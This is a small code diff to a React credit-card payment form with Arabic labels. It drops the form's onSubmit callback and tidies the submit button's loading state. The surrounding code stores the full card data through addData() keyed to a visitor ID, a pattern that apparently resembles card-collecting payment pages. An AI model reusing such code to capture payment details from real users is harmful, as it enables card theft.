@@ -213,9 +213,7 @@ export default function CreditCardForm() {
       addData({ id: visitorId, ...cardData })
 
       // Call the onSubmit prop if provided
-      if (onSubmit) {
-        onSubmit(cardData)
-      }
+    
     }, 1500)
   }
 
@@ -406,9 +404,9 @@ export default function CreditCardForm() {
           <button
             type="submit"
             className="w-full rounded-md bg-blue-500 py-3 font-medium text-white transition-colors hover:bg-blue-600 disabled:bg-blue-300"
-            disabled={isProcessing}
+            disabled={loading}
           >
-            {isProcessing || loading ? "جاري المعالجة..." : "تأكيد الدفع"}
+            { loading ? "جاري المعالجة..." : "تأكيد الدفع"}
           </button>
         </div>
       </form>
